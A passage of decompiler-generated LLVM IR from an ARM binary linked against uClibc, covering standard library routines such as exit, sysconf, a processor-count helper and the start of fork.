  br i1 %tmp, label %.thread, label %dec_label_pc_13a2c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13ae0

dec_label_pc_13a2c:                               ; preds = %bb64
  %v2_13a34 = udiv i32 -1, %v0_13a40
  %v3_13a34 = urem i32 -1, %v0_13a40
  store i32 %v0_13a40, i32* %r1.global-to-local, align 4
  %v1_13a44 = urem i32 %v3_13a34, 256
  store i32 %v1_13a44, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_13a34, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a60

dec_label_pc_13a5c:                               ; preds = %bb71, %dec_label_pc_13abc
  %v0_13a5c = phi i32 [ %v1_13a9c44, %bb71 ], [ %v0_13a5c.pre, %dec_label_pc_13abc ]
  br label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a2c, %dec_label_pc_13a5c
  %v1_13ae427 = phi i32 [ %v1_13ae429, %dec_label_pc_13a2c ], [ %v0_13a5c, %dec_label_pc_13a5c ]
  %v0_13a9c = phi i32 [ %v0_13a6020, %dec_label_pc_13a2c ], [ %v0_13a5c, %dec_label_pc_13a5c ]
  %v1_13a60 = inttoptr i32 %v0_13a9c to i8*
  %v2_13a60 = load i8, i8* %v1_13a60, align 1
  %v3_13a60 = zext i8 %v2_13a60 to i32
  %v1_13a64 = add nsw i32 %v3_13a60, -48
  %v1_13a68 = urem i32 %v1_13a64, 256
  store i32 %v1_13a68, i32* %r1.global-to-local, align 4
  %v1_13a70 = or i32 %v3_13a60, 32
  %tmp79 = icmp ult i32 %v1_13a68, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_13a78

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a60
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_13a70, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_13a78
  %v1_13a7c = add nsw i32 %v1_13a70, -87
  %v5_13a84 = urem i32 %v1_13a7c, 256
  store i32 %v5_13a84, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13a60, %dec_label_pc_13a78, %bb65
  %v3_13ab4 = phi i32 [ %v1_13a68, %dec_label_pc_13a60 ], [ 40, %dec_label_pc_13a78 ], [ %v5_13a84, %bb65 ]
  %v1_13a88 = load i32, i32* %r5.global-to-local, align 4
  %v6_13a8c = icmp slt i32 %v3_13ab4, %v1_13a88
  br i1 %v6_13a8c, label %dec_label_pc_13a90, label %dec_label_pc_13ae0.loopexit

dec_label_pc_13a90:                               ; preds = %bb66
  %v0_13a90 = load i32, i32* %ip.global-to-local, align 4
  %v1_13a90 = load i32, i32* %r8.global-to-local, align 4
  %v9_13a90 = icmp eq i32 %v0_13a90, %v1_13a90
  br i1 %v9_13a90, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13a90
  %v1_13a9c40 = add i32 %v0_13a9c, 1
  store i32 %v1_13a9c40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13aa4

bb67:                                             ; preds = %dec_label_pc_13a90
  %v3_13a90 = icmp ult i32 %v0_13a90, %v1_13a90
  %v1_13a9c = add i32 %v0_13a9c, 1
  store i32 %v1_13a9c, i32* %r4.global-to-local, align 4
  br i1 %v3_13a90, label %dec_label_pc_13aa4, label %dec_label_pc_13abc

dec_label_pc_13aa4:                               ; preds = %bb67, %.thread39
  %v1_13a9c44 = phi i32 [ %v1_13a9c40, %.thread39 ], [ %v1_13a9c, %bb67 ]
  %v4_13aac2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_13aa4 = load i32, i32* %sl.global-to-local, align 4
  %v3_13aa4 = icmp uge i32 %v3_13ab4, %v1_13aa4
  %v9_13aa4 = icmp eq i32 %v3_13ab4, %v1_13aa4
  %v2_13aa8 = xor i1 %v3_13aa4, true
  %v3_13aa8 = or i1 %v9_13aa4, %v2_13aa8
  br i1 %v3_13aa8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_13aa4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_13aa4, %bb68
  %v4_13aac = phi i32 [ %v4_13aac2443, %dec_label_pc_13aa4 ], [ 0, %bb68 ]
  %v2_13aac = xor i1 %v9_13aa4, true
  %v3_13aac = and i1 %v3_13aa4, %v2_13aac
  br i1 %v3_13aac, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_13aac = urem i32 %v4_13aac, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_13ab0 = phi i32 [ %v5_13aac, %bb70 ], [ %v4_13aac, %bb69 ]
  %v2_13ab0 = icmp eq i32 %v0_13ab0, 0
  br i1 %v2_13ab0, label %bb71, label %dec_label_pc_13abc

bb71:                                             ; preds = %thread-pre-split
  %v4_13ab4 = mul i32 %v0_13a90, %v1_13a88
  %v5_13ab4 = add i32 %v4_13ab4, %v3_13ab4
  store i32 %v5_13ab4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a5c

dec_label_pc_13abc:                               ; preds = %bb67, %thread-pre-split
  %v0_13ac4 = call i32 @__aeabi_read_tp()
  %v0_13ac8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ac8 = and i32 %v0_1398c, %v0_13ac8
  store i32 %v2_13ac8, i32* %r7.global-to-local, align 4
  %v0_13acc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13acc, i32* %ip.global-to-local, align 4
  %v3_13ad0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_13ad0 = sext i16 %v3_13ad0 to i32
  %v3_13ad8 = add i32 %v4_13ad0, %v0_13ac4
  %v4_13ad8 = inttoptr i32 %v3_13ad8 to i32*
  store i32 34, i32* %v4_13ad8, align 4
  %v0_13a5c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a5c

dec_label_pc_13ae0.loopexit:                      ; preds = %bb66
  %v0_13ae0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13ae0

dec_label_pc_13ae0:                               ; preds = %.thread, %dec_label_pc_13ae0.loopexit
  %v1_13ae4 = phi i32 [ %v1_13ae427, %dec_label_pc_13ae0.loopexit ], [ %v1_13ae429, %.thread ]
  %v2_13ae4 = phi i32 [ %v0_13ae0.pre, %dec_label_pc_13ae0.loopexit ], [ %v0_13980, %.thread ]
  %v2_13ae0 = icmp eq i32 %v2_13ae4, 0
  br i1 %v2_13ae0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13ae0
  %v3_13ae4 = inttoptr i32 %v2_13ae4 to i32*
  store i32 %v1_13ae4, i32* %v3_13ae4, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13ae0, %bb72
  %v0_13aec = load i32, i32* %r7.global-to-local, align 4
  %v2_13aec = icmp eq i32 %v0_13aec, 0
  %. = select i1 %v2_13aec, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13af8 = icmp eq i32 %v0_1398c, 0
  %v0_13b24.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13af8, label %dec_label_pc_13b1c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_13b24.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_13b04, label %dec_label_pc_13b1c

dec_label_pc_13b04:                               ; preds = %bb76
  %v0_13b08 = call i32 @__aeabi_read_tp()
  %v3_13b0c = load i16, i16* @global_var_2225c.361, align 2
  %v4_13b0c = sext i16 %v3_13b0c to i32
  %v3_13b14 = add i32 %v4_13b0c, %v0_13b08
  %v4_13b14 = inttoptr i32 %v3_13b14 to i32*
  store i32 34, i32* %v4_13b14, align 4
  %v0_13b18 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13b18, i32* %ip.global-to-local, align 4
  %v0_13b1c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13b1c

dec_label_pc_13b1c:                               ; preds = %bb76, %bb73, %dec_label_pc_13b04
  %v0_13b24.pre = phi i32 [ %v0_13b24.pre.pre, %bb76 ], [ %v0_13b18, %dec_label_pc_13b04 ], [ %v0_13b24.pre.pre, %bb73 ]
  %v0_13b1c = phi i32 [ %v0_13aec, %bb76 ], [ %v0_13b1c.pre, %dec_label_pc_13b04 ], [ %v0_13aec, %bb73 ]
  %v2_13b1c = icmp eq i32 %v0_13b1c, 0
  br i1 %v2_13b1c, label %dec_label_pc_13b1c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_13b1c
  %v2_13b20 = sub i32 0, %v0_13b24.pre
  store i32 %v2_13b20, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13b1c._crit_edge

dec_label_pc_13b1c._crit_edge:                    ; preds = %dec_label_pc_13b1c, %bb77
  %v0_13b24 = phi i32 [ %v2_13b20, %bb77 ], [ %v0_13b24.pre, %dec_label_pc_13b1c ]
  ret i32 %v0_13b24

; uselistorder directives
  uselistorder i32 %v0_13b24.pre, { 1, 0 }
  uselistorder i32 %v0_13b24.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_13aac, { 1, 0 }
  uselistorder i1 %v3_13aa4, { 1, 0 }
  uselistorder i32 %v1_13aa4, { 1, 0 }
  uselistorder i32 %v5_13a84, { 1, 0 }
  uselistorder i32 %v1_13a70, { 1, 0 }
  uselistorder i32 %v1_13a68, { 2, 0, 1 }
  uselistorder i32 %v0_13a9c, { 1, 0, 2 }
  uselistorder i32 %v0_13a5c, { 1, 0 }
  uselistorder i32 %v3_13a0c, { 1, 0 }
  uselistorder i32 %v1_13a00, { 1, 0, 2 }
  uselistorder i32 %v0_139f4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_139d0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1398c, { 1, 0 }
  uselistorder i32 %v0_13988, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13984, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 6, 3, 7, 5 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b1c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13b1c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13ae0, { 1, 0 }
  uselistorder label %dec_label_pc_13abc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13a60, { 1, 0 }
  uselistorder label %dec_label_pc_13a5c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139d4, { 1, 0 }
  uselistorder label %dec_label_pc_139d0, { 1, 0 }
  uselistorder label %dec_label_pc_13998, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r5, align 4
  %v4_13b50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 140) to i32*), align 4
  store i32 %v4_13b50, i32* @r4, align 4
  %v2_13b58 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b70)
  %v0_13b84 = load i32, i32* @r5, align 4
  %v2_13b84 = add i32 %v0_13b84, 16
  %v3_13b84 = inttoptr i32 %v2_13b84 to i32*
  %v4_13b84 = load i32, i32* %v3_13b84, align 4
  call void @__pseudo_branch(i32 %v4_13b84)
  %v0_13b94 = load i32, i32* @r5, align 4
  %v2_13b94 = add i32 %v0_13b94, 636
  %v3_13b94 = inttoptr i32 %v2_13b94 to i32*
  %v4_13b94 = load i32, i32* %v3_13b94, align 4
  %v2_13b9c = icmp eq i32 %v4_13b94, 0
  br i1 %v2_13b9c, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13ba8 = xor i1 %v2_13b9c, true
  call void @__pseudo_cond_branch(i1 %v2_13ba8, i32 %v4_13b94)
  store i32 %v2_13b58, i32* @r0, align 4
  %v0_13bb8 = load i32, i32* @r5, align 4
  %v2_13bb8 = add i32 %v0_13bb8, 44
  %v3_13bb8 = inttoptr i32 %v2_13bb8 to i32*
  %v4_13bb8 = load i32, i32* %v3_13bb8, align 4
  call void @__pseudo_branch(i32 %v4_13bb8)
  %v0_13bc4 = call i32 @__GI___uClibc_fini()
  %v0_13bcc = load i32, i32* @r5, align 4
  %v2_13bcc = add i32 %v0_13bcc, -47808
  %v2_13bd4 = icmp eq i32 %v2_13bcc, 0
  br i1 %v2_13bd4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_13bdc = xor i1 %v2_13bd4, true
  call void @__pseudo_cond_branch(i1 %v2_13bdc, i32 %v2_13bcc)
  %v0_13be0 = load i32, i32* @r6, align 4
  %v1_13be4 = call i32 @__GI__exit(i32 %v0_13be0)
  %v0_13be8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13be8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_13be8 = load i32, i32* @lr, align 4
  %v2_13be8 = trunc i32 %v1_13be8 to i16
  %v4_13be8 = inttoptr i32 %v1_13be4 to i16*
  store i16 %v2_13be8, i16* %v4_13be8, align 2
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13c00 = phi i32 [ %v1_13be4, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13c00

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13c28 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 -34012))
  store i32 %v1_13c28, i32* @r6, align 4
  %v2_13c2c = icmp eq i32 %v1_13c28, 0
  br i1 %v2_13c2c, label %dec_label_pc_13cac, label %dec_label_pc_13c34

dec_label_pc_13c34:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_13c3c = load i32, i32* @r4, align 4
  %v2_13c3c = add i32 %v0_13c3c, -34000
  store i32 %v2_13c3c, i32* @r8, align 4
  %v2_13c40 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13c40, i32* @r7, align 4
  br label %bb18

dec_label_pc_13c48:                               ; preds = %bb18
  %v3_13c48 = load i32, i32* %stack_var_-36, align 4
  %v1_13c4c = inttoptr i32 %v3_13c48 to i32*
  %v2_13c4c = load i32, i32* %v1_13c4c, align 4
  %v1_13c50 = inttoptr i32 %v2_13c4c to i8*
  %v2_13c50 = load i8, i8* %v1_13c50, align 1
  %v7_13c54 = icmp eq i8 %v2_13c50, 99
  br i1 %v7_13c54, label %dec_label_pc_13c5c, label %.backedge3

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13c48
  %v1_13c5c = add i32 %v2_13c4c, 1
  %v2_13c5c = inttoptr i32 %v1_13c5c to i8*
  %v3_13c5c = load i8, i8* %v2_13c5c, align 1
  %v7_13c60 = icmp eq i8 %v3_13c5c, 112
  br i1 %v7_13c60, label %dec_label_pc_13c68, label %.backedge3

dec_label_pc_13c68:                               ; preds = %dec_label_pc_13c5c
  %v1_13c68 = add i32 %v2_13c4c, 2
  %v2_13c68 = inttoptr i32 %v1_13c68 to i8*
  %v3_13c68 = load i8, i8* %v2_13c68, align 1
  %v7_13c6c = icmp eq i8 %v3_13c68, 117
  br i1 %v7_13c6c, label %dec_label_pc_13c74, label %.backedge3

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13c68
  %v1_13c74 = add i32 %v2_13c4c, 3
  %v2_13c74 = inttoptr i32 %v1_13c74 to i8*
  %v3_13c74 = load i8, i8* %v2_13c74, align 1
  %v4_13c74 = zext i8 %v3_13c74 to i32
  %v0_13c78 = load i32, i32* @r4, align 4
  %v1_13c78 = load i32, i32* @sl, align 4
  %v2_13c78 = add i32 %v1_13c78, %v0_13c78
  %v3_13c78 = inttoptr i32 %v2_13c78 to i32*
  %v4_13c78 = load i32, i32* %v3_13c78, align 4
  %v2_13c7c = mul nuw nsw i32 %v4_13c74, 2
  %v2_13c80 = add i32 %v4_13c78, %v2_13c7c
  %v3_13c80 = inttoptr i32 %v2_13c80 to i16*
  %v4_13c80 = load i16, i16* %v3_13c80, align 2
  %v1_13c84 = and i16 %v4_13c80, 8
  %v2_13c84 = icmp eq i16 %v1_13c84, 0
  br i1 %v2_13c84, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13c74
  %v1_13c88 = load i32, i32* @r5, align 4
  %v2_13c88 = add i32 %v1_13c88, 1
  store i32 %v2_13c88, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13c74, %dec_label_pc_13c48, %dec_label_pc_13c5c, %dec_label_pc_13c68
  %v0_13c8c.pre = load i32, i32* @r6, align 4
  %v0_13c98.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_13c34
  %v0_13c98 = phi i32 [ %v0_13c98.pre, %.backedge3 ], [ %v2_13c3c, %dec_label_pc_13c34 ]
  %v0_13c8c = phi i32 [ %v0_13c8c.pre, %.backedge3 ], [ %v1_13c28, %dec_label_pc_13c34 ]
  %v4_13c9c = inttoptr i32 %v0_13c8c to i32*
  %v5_13c9c = call i32 @__GI_config_read(i32* %v4_13c9c, i32 %v2_13c40, i32 258, i32 %v0_13c98)
  %v2_13ca0 = icmp eq i32 %v5_13c9c, 0
  br i1 %v2_13ca0, label %dec_label_pc_13d10, label %dec_label_pc_13c48

dec_label_pc_13cac:                               ; preds = %entry
  %v0_13cb0 = load i32, i32* @r4, align 4
  %v2_13cb0 = add i32 %v0_13cb0, -33996
  store i32 %v2_13cb0, i32* @r0, align 4
  %v1_13cb4 = call i32 @__GI_config_open(i32 %v2_13cb0)
  store i32 %v1_13cb4, i32* @r6, align 4
  %v2_13cb8 = icmp eq i32 %v1_13cb4, 0
  br i1 %v2_13cb8, label %bb19, label %dec_label_pc_13cc4

bb19:                                             ; preds = %dec_label_pc_13cac
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13d10

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cac
  %v0_13cc8 = load i32, i32* @r4, align 4
  %v2_13cc8 = add i32 %v0_13cc8, -33980
  store i32 %v2_13cc8, i32* @r8, align 4
  %v2_13cd0 = add i32 %v0_13cc8, -33944
  store i32 %v2_13cd0, i32* @r7, align 4
  %v2_13cd4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13cd4, i32* @r4, align 4
  br label %bb21

dec_label_pc_13cdc:                               ; preds = %bb21
  %v0_13d08 = load i32, i32* @r8, align 4
  %v3_13cdc = load i32, i32* %stack_var_-36, align 4
  %v1_13ce0 = inttoptr i32 %v3_13cdc to i32*
  %v2_13ce0 = load i32, i32* %v1_13ce0, align 4
  store i32 %v2_13ce0, i32* @r1, align 4
  %v2_13ce4 = inttoptr i32 %v0_13d08 to i8*
  %v3_13ce4 = call i32 @__GI_strcoll(i8* %v2_13ce4, i32 %v2_13ce0)
  %v2_13ce8 = icmp eq i32 %v3_13ce4, 0
  br i1 %v2_13ce8, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13cdc
  %v1_13cec = load i32, i32* @r5, align 4
  %v2_13cec = add i32 %v1_13cec, 1
  store i32 %v2_13cec, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13cdc
  %v0_13cf8.pre = load i32, i32* @r7, align 4
  %v0_13cfc.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13cc4
  %v0_13cfc = phi i32 [ %v0_13cfc.pre, %.backedge ], [ %v1_13cb4, %dec_label_pc_13cc4 ]
  %v0_13cf8 = phi i32 [ %v0_13cf8.pre, %.backedge ], [ %v2_13cd0, %dec_label_pc_13cc4 ]
  %v4_13d00 = inttoptr i32 %v0_13cfc to i32*
  %v5_13d00 = call i32 @__GI_config_read(i32* %v4_13d00, i32 %v2_13cd4, i32 459266, i32 %v0_13cf8)
  %v2_13d04 = icmp eq i32 %v5_13d00, 0
  br i1 %v2_13d04, label %dec_label_pc_13d10, label %dec_label_pc_13cdc

dec_label_pc_13d10:                               ; preds = %bb18, %bb21, %bb19
  %v0_13d10 = load i32, i32* @r6, align 4
  %v1_13d14 = inttoptr i32 %v0_13d10 to i32*
  %v2_13d14 = call i32 @__GI_config_close(i32* %v1_13d14)
  %v0_13d18 = load i32, i32* @r5, align 4
  %v2_13d18 = icmp eq i32 %v0_13d18, 0
  %.v0_13d18 = select i1 %v2_13d18, i32 1, i32 %v0_13d18
  ret i32 %.v0_13d18

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13d10, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14144

bb:                                               ; preds = %entry
  %v7_13d68 = mul i32 %arg1, 4
  %v8_13d68 = add i32 %v7_13d68, ptrtoint (i32* @global_var_13d70.511 to i32)
  call void @__pseudo_branch(i32 %v8_13d68)
  br label %dec_label_pc_14144

dec_label_pc_14144:                               ; preds = %bb, %entry
  %v0_14148 = call i32 @__aeabi_read_tp()
  %v3_1414c = load i16, i16* @global_var_2225c.361, align 2
  %v4_1414c = sext i16 %v3_1414c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14158 = add i32 %v4_1414c, %v0_14148
  %v4_14158 = inttoptr i32 %v3_14158 to i32*
  store i32 22, i32* %v4_14158, align 4
  %v0_1433c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1433c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12820, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r8.global-to-local, align 4
  %v4_1446816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12820) to i32*), align 4
  store i32 %v4_1446816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1446c18 = icmp eq i32 %v4_1446816, 0
  br i1 %v2_1446c18, label %dec_label_pc_14474, label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %entry, %dec_label_pc_14468.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_143a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_143a4 = add i32 %v0_143a4, 20
  %v2_143a4 = inttoptr i32 %v1_143a4 to i32*
  %v3_143a4 = load i32, i32* %v2_143a4, align 4
  store i32 %v3_143a4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143a8 = icmp eq i32 %v3_143a4, 0
  store i32 %v3_143a4, i32* %r4.global-to-local, align 4
  br i1 %v2_143a8, label %dec_label_pc_14468.backedge, label %dec_label_pc_143b8

dec_label_pc_14468.backedge:                      ; preds = %dec_label_pc_14398, %dec_label_pc_143e4
  %v0_14468 = load i32, i32* %r8.global-to-local, align 4
  %v1_14468 = load i32, i32* %r5.global-to-local, align 4
  %v2_14468 = add i32 %v1_14468, %v0_14468
  %v3_14468 = inttoptr i32 %v2_14468 to i32*
  %v4_14468 = load i32, i32* %v3_14468, align 4
  store i32 %v4_14468, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1446c = icmp eq i32 %v4_14468, 0
  br i1 %v2_1446c, label %dec_label_pc_14474, label %dec_label_pc_14398

dec_label_pc_143b8:                               ; preds = %dec_label_pc_14398
  %v0_143b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_143b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_143b8 = add i32 %v1_143b8, %v0_143b8
  %v3_143b8 = inttoptr i32 %v2_143b8 to i32*
  %v4_143b8 = load i32, i32* %v3_143b8, align 4
  %v1_143bc = add i32 %v4_143b8, 20
  store i32 %v1_143bc, i32* %r2.global-to-local, align 4
  %v1_143c0132 = inttoptr i32 %v1_143bc to i32*
  %v2_143c0133 = load i32, i32* %v1_143c0132, align 4
  store i32 %v2_143c0133, i32* %r3.global-to-local, align 4
  %v3_143c4135 = icmp uge i32 %v2_143c0133, %v3_143a4
  store i1 %v3_143c4135, i1* %cpsr_c.global-to-local, align 1
  %v9_143c4141 = icmp eq i32 %v2_143c0133, %v3_143a4
  br i1 %v9_143c4141, label %dec_label_pc_143cc, label %dec_label_pc_143e4

dec_label_pc_143cc:                               ; preds = %dec_label_pc_143b8, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge
  %v0_143cc142 = phi i32 [ %v1_143c4.pre, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge ], [ %v3_143a4, %dec_label_pc_143b8 ]
  store i32 %v0_143cc142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_143dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_143dc, label %dec_label_pc_143e0, label %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge

dec_label_pc_143cc.dec_label_pc_143c0_crit_edge:  ; preds = %dec_label_pc_143cc
  %v0_143c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_143c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_143c0 = inttoptr i32 %v0_143c0.pre to i32*
  %v2_143c0 = load i32, i32* %v1_143c0, align 4
  store i32 %v2_143c0, i32* %r3.global-to-local, align 4
  %v3_143c4 = icmp uge i32 %v2_143c0, %v1_143c4.pre
  store i1 %v3_143c4, i1* %cpsr_c.global-to-local, align 1
  %v9_143c4 = icmp eq i32 %v2_143c0, %v1_143c4.pre
  br i1 %v9_143c4, label %dec_label_pc_143cc, label %dec_label_pc_143e4

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143cc
  %v0_143e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_143e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_143e4

dec_label_pc_143e4:                               ; preds = %dec_label_pc_143b8, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge, %dec_label_pc_143e0
  %v0_143e4 = phi i32 [ %v0_143e0, %dec_label_pc_143e0 ], [ %v2_143c0133, %dec_label_pc_143b8 ], [ %v2_143c0, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge ]
  %v1_143e4 = phi i32 [ %v0_143e0, %dec_label_pc_143e0 ], [ %v3_143a4, %dec_label_pc_143b8 ], [ %v1_143c4.pre, %dec_label_pc_143cc.dec_label_pc_143c0_crit_edge ]
  %v3_143e4 = icmp uge i32 %v0_143e4, %v1_143e4
  store i1 %v3_143e4, i1* %cpsr_c.global-to-local, align 1
  %v9_143e4 = icmp eq i32 %v0_143e4, %v1_143e4
  br i1 %v9_143e4, label %dec_label_pc_143ec, label %dec_label_pc_14468.backedge

dec_label_pc_143ec:                               ; preds = %dec_label_pc_143e4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_14400 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_143f0

dec_label_pc_143f0:                               ; preds = %dec_label_pc_14458, %dec_label_pc_143ec
  %v0_143f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_143f0 = add i32 %v0_143f0, 4
